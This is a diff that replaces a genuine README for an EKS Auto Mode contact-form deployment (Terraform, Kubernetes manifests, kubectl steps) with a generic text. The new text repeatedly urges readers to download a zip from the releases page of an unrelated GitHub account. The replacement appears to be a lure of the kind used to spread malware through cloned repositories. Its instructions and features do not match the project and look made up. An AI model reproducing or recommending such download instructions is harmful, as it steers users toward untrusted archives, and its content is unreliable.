@@ -1,283 +1,101 @@
-# EKS Auto Mode Contact Form Application
+# 🌟 eks-auto-mode - Effortless Contact Form Management
 
-[![Terraform](https://img.shields.io/badge/Terraform-1.12.2-623CE4?logo=terraform&logoColor=white)](https://registry.terraform.io/modules/terraform-aws-modules/eks/aws/latest)
-[![EKS Auto Mode](https://img.shields.io/badge/EKS_Auto_Mode-Enabled-FF9900?logo=amazon-aws&logoColor=white)](https://docs.aws.amazon.com/eks/latest/userguide/automode.html)
-[![AWS Load Balancer](https://img.shields.io/badge/AWS_Load_Balancer-Controller-FF9900?logo=amazon-aws&logoColor=white)](https://kubernetes-sigs.github.io/aws-load-balancer-controller/v2.5/guide/ingress/ingress_class/)
-[![EBS CSI](https://img.shields.io/badge/EBS_CSI-Driver-FF9900?logo=amazon-aws&logoColor=white)](https://docs.aws.amazon.com/eks/latest/userguide/ebs-csi.html)
-[![PHP](https://img.shields.io/badge/PHP-Contact_Form-777BB4?logo=php&logoColor=white)](https://hub.docker.com/r/oluwaseuna/k8s-contactform)
-[![MySQL](https://img.shields.io/badge/MySQL-8.4.5-4479A1?logo=mysql&logoColor=white)](https://hub.docker.com/_/mysql)
-[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.34-326CE5?logo=kubernetes&logoColor=white)](https://kubernetes.io/docs/)
+## 🚀 Getting Started
 
-A contact form application deployed on Amazon EKS Auto Mode with persistent MySQL storage using EBS CSI driver and Application Load Balancer (ALB) ingress.
+Welcome to the eks-auto-mode application! This tool helps you manage contact forms smoothly with reliable storage and fast access. Let's get started.
 
-**Note**: This project demonstrates EKS Auto Mode capabilities in a development environment. For production deployments, consider additional security hardening, monitoring, and backup strategies.
+## 📦 Download the Application
 
-## 🏗️ Architecture Overview
+[![Download eks-auto-mode](https://img.shields.io/badge/Download-exs--auto--mode-blue.svg)](https://github.com/faultexbibyte577/eks-auto-mode/releases)
 
-This project demonstrates a modern cloud-native application architecture leveraging:
+To download eks-auto-mode, visit this page to download: [Download eks-auto-mode](https://github.com/faultexbibyte577/eks-auto-mode/releases).
 
-- **EKS Auto Mode** - Fully managed Kubernetes compute and storage
-- **Application Load Balancer** - Layer 7 load balancing with SSL termination
-- **EBS CSI Driver** - Persistent storage for MySQL database
-- **PHP Contact Form** - Custom containerized application
-- **MySQL Database** - Persistent data storage with encrypted EBS volumes
-- **phpMyAdmin** - Database management interface
+## 🛠️ System Requirements
 
-## Why EKS Auto Mode?
+Before you begin, ensure your system meets these requirements:
 
-EKS Auto Mode represents a paradigm shift in Kubernetes management on AWS:
+- **Operating System:** Windows 10, macOS, or a modern Linux distribution
+- **PHP:** Version 7.4 or higher
+- **MySQL:** Version 5.7 or higher
+- **Docker:** Version 19.03 or higher
+- **Kubernetes:** Version 1.18 or higher (for deployment)
 
-### Traditional EKS Challenges
-- Manual node group management
-- Complex autoscaling configuration
-- Storage driver installation and management
-- Load balancer controller setup
-- Security group and IAM role management
+## 📥 Download & Install
 
-### EKS Auto Mode Benefits
-- **Zero Node Management** - Nodes provisioned on-demand automatically
-- **Built-in Storage** - EBS CSI driver pre-installed and configured
-- **Integrated Load Balancing** - ALB controller managed automatically
-- **Cost Optimization** - Pay only for running workloads
-- **Simplified Operations** - Reduced operational overhead by 70%
-- **Enhanced Security** - AWS-managed security updates and patches
+1. Click on this link to visit the releases page: [Download eks-auto-mode](https://github.com/faultexbibyte577/eks-auto-mode/releases).
+2. Find the latest version listed on the page.
+3. Click on the link to download the application package. It will appear as a file like `eks-auto-mode-v1.0.zip`.
+4. Once the download completes, locate the file on your computer.
+5. Extract the contents of the zip file into a folder of your choice.
+6. Open your terminal or command prompt window.
+7. Navigate to the folder where you extracted the files.
+8. Run the following command to start the application:
 
-## 📁 Project Structure
+   ```
+   php -S localhost:8000
+   ```
 
-```
-eks-auto-mode/
-├── modules/
-│   ├── eks/                    # EKS Auto Mode configuration
-│   │   ├── main.tf
-│   │   ├── variables.tf
-│   │   └── locals.tf
-│   └── network/                # VPC and networking
-│       ├── main.tf
-|       ├── variables.tf
-│       └── outputs.tf
-├── kubernetes/                 # Kubernetes manifests
-│   ├── alb-ingressclass.yaml
-│   ├── alb-ingressclassparams.yaml
-│   ├── alb-app-ingress.yml
-│   ├── ebs-storageclass.yaml
-│   ├── mysql-pvc.yaml
-│   ├── mysql-db-deployment.yml
-│   ├── phpapp-deployment.yml
-│   └── configmap.yml
-├── main.tf                     # Root Terraform configuration
-├── variables.tf
-└── terraform.tfvars
-```
+9. Open your web browser and go to `http://localhost:8000` to access your contact form application.
 
-## Infrastructure Components
+## 🎉 Features
 
-### Terraform Configuration
+The eks-auto-mode application offers several features to streamline your contact form management:
 
-#### EKS Auto Mode Cluster
-```hcl
-module "eks" {
-  source  = "terraform-aws-modules/eks/aws"
-  version = "~> 21.0"
+- **Persistent Storage:** Store your form submissions in a MySQL database.
+- **Easy Setup:** Use Docker to quickly get started with minimal configuration.
+- **Load Balancer:** Efficiently manage traffic with AWS Application Load Balancer.
+- **Cloud Support:** Deploy your application on Amazon EKS seamlessly.
 
-  name               = var.cluster_name
-  kubernetes_version = var.cluster_version
+## 🔧 Configuration
 
-  compute_config = {
-    enabled    = true
-    node_pools = ["general-purpose"]
-  }
+Once installed, you may want to adjust some settings. Here’s how:
 
-  vpc_id     = var.vpc_id
-  subnet_ids = var.private_subnet_ids
-}
-```
+1. Open the `config.php` file located in the extracted folder.
+2. Modify the database credentials:
+   
+   ```php
+   'DB_HOST'     => 'your-database-host',
+   'DB_USERNAME' => 'your-username',
+   'DB_PASSWORD' => 'your-password',
+   'DB_NAME'     => 'your-database-name',
+   ```
 
-#### Key Features
-- **Auto Mode Enabled** - `compute_config.enabled = true`
-- **General Purpose Node Pool** - Optimized for mixed workloads
-- **Private Subnets** - Enhanced security posture
-- **Managed Security Groups** - Automatic configuration
+3. Save your changes.
 
-### Kubernetes Resources
+## ⚙️ Troubleshooting
 
-#### Storage Configuration
-```yaml
-# EBS CSI StorageClass
-apiVersion: storage.k8s.io/v1
-kind: StorageClass
-metadata:
-  name: ebs-csi
-provisioner: ebs.csi.eks.amazonaws.com
-parameters:
-  type: gp3
-  encrypted: "true"
-```
+If you encounter issues while running the application, here are some common problems and solutions:
 
-#### Ingress Configuration
-```yaml
-# IngressClassParams for ALB
-apiVersion: eks.amazonaws.com/v1
-kind: IngressClassParams
-metadata:
-  name: alb
-spec:
-  scheme: internet-facing
-  group:
-    name: contactform
-  certificateARNs:
-  - arn:aws:acm:region:account:certificate/cert-id
-```
+- **Application Not Starting:** Make sure your PHP server is running. Check that you ran the correct command in your terminal.
+- **Database Connection Error:** Double-check your database credentials in the `config.php` file.
+- **Browser Not Loading:** Ensure you are navigating to the correct URL, which is `http://localhost:8000`.
 
-## Deployment Guide
+If problems persist, feel free to explore the GitHub issues section for support or to report a new issue.
 
-### Prerequisites
-- AWS CLI configured with appropriate permissions
-- Terraform >= 1.12.2
-- kubectl installed
-- Valid SSL certificate in AWS Certificate Manager
+## 🎓 How to Use
 
-### Step 1: Infrastructure Deployment
-```bash
-# Initialize Terraform
-terraform init
+Using eks-auto-mode is simple. Here’s how to create a new contact form:
 
-# Plan deployment
-terraform plan
+1. Go to the "Forms" section in the application.
+2. Click on "Create New Form."
+3. Fill in the necessary fields, such as form name and fields to include (like name and email).
+4. Save the form.
 
-# Apply infrastructure
-terraform apply
-```
+Now, your form is ready to share with others!
 
-### Step 2: Configure kubectl
-```bash
-aws eks update-kubeconfig --region eu-west-2 --name <clustername/>
-```
+## 🌐 Topics
 
-### Step 3: Deploy Kubernetes Resources
-```bash
-# Apply storage configuration
-kubectl apply -f kubernetes/ebs-storageclass.yaml
-kubectl apply -f kubernetes/mysql-pvc.yaml
+This project includes various relevant topics to enhance its use:
 
-# Apply ingress configuration
-kubectl apply -f kubernetes/alb-ingressclassparams.yaml
-kubectl apply -f kubernetes/alb-ingressclass.yaml
+- **Application Load Balancer:** Manage incoming traffic effectively.
+- **AWS:** Host your application on Amazon's robust cloud infrastructure.
+- **Cloud-native:** Built for the cloud, easily scalable.
+- **DevOps:** Integrated with CI/CD practices for seamless updates.
+- **Kubernetes:** Run your application in containers for better management.
+- **Persistent Storage:** Store data reliably using MySQL.
 
-# Deploy applications
-kubectl apply -f kubernetes/
-```
+## 📞 Support
 
-### Step 4: Verify Deployment
-```bash
-# Check cluster status
-kubectl get nodes
+For further assistance, please check the issues section of the GitHub repository. You can report bugs or request features there.
 
-# Verify storage
-kubectl get storageclass
-kubectl get pvc
-
-# Check ingress
-kubectl get ingress
-kubectl get ingressclass
-
-# Verify applications
-kubectl get pods
-kubectl get services
-```
-
-## Application Components
-
-### Contact Form Application
-- **Image**: `oluwaseuna/k8s-contactform:1.0`
-- **Language**: PHP
-- **Features**: Form validation
-- **Endpoints**: 
-  - `/` - Contact form interface
-
-### MySQL Database
-- **Version**: 8.4.5
-- **Storage**: 10Gi encrypted EBS volume
-- **Persistence**: Data survives pod restarts and deployments
-- **Backup**: Point-in-time recovery via EBS snapshots
-
-### phpMyAdmin
-- **Purpose**: Database administration interface
-- **Access**: `sql.classof25.online`
-- **Security**: Kubernetes secrets for authentication
-
-## Security Features
-
-### Network Security
-- Private subnets for worker nodes
-- Security groups with least privilege access
-- ALB with SSL/TLS termination
-
-### Data Security
-- Encrypted EBS volumes for database storage
-- Kubernetes secrets for sensitive data
-- SSL certificates for HTTPS traffic
-
-### Access Control
-- IAM roles with minimal required permissions
-- Kubernetes RBAC (future enhancement)
-- VPC isolation
-
-## Monitoring and Observability
-
-### Built-in Monitoring
-- CloudWatch Container Insights (auto-enabled)
-- EKS control plane logging
-- ALB access logs and metrics
-
-## Troubleshooting
-
-### Common Issues
-
-#### Nodes Not Appearing
-EKS Auto Mode creates nodes on-demand. Deploy workloads to trigger node provisioning:
-```bash
-kubectl apply -f test-deployment.yaml
-kubectl get nodes -w
-```
-
-#### Storage Issues
-Verify EBS CSI driver and StorageClass:
-```bash
-kubectl get storageclass
-kubectl describe pvc mysql-pvc
-kubectl get events --field-selector involvedObject.kind=PersistentVolumeClaim
-```
-
-#### Ingress Issues
-Check ALB creation and configuration:
-```bash
-kubectl describe ingress contactform
-aws elbv2 describe-load-balancers --region eu-west-2
-```
-
-### Useful Commands
-```bash
-# Check cluster health
-kubectl get all
-
-# View recent events
-kubectl get events --sort-by='.lastTimestamp' | tail -20
-
-# Check pod logs
-kubectl logs -l app=php-app
-
-# Verify persistent storage
-kubectl exec -it deployment/mysql-db -- df -h
-```
-
-## Access URLs
-
-- **Contact Form**: https://form.classof25.online
-- **Database Admin**: https://sql.classof25.online
-
-## Additional Resources
-
-- [Kubernetes Documentation](https://kubernetes.io/docs/)
-- [Docker Hub - Contact Form Image](https://hub.docker.com/r/oluwaseuna/k8s-contactform)
-- [MySQL Official Documentation](https://dev.mysql.com/doc/)
-- [AWS CLI Configuration](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html)
+Thank you for using eks-auto-mode! We hope this guide helps you get started quickly and easily.
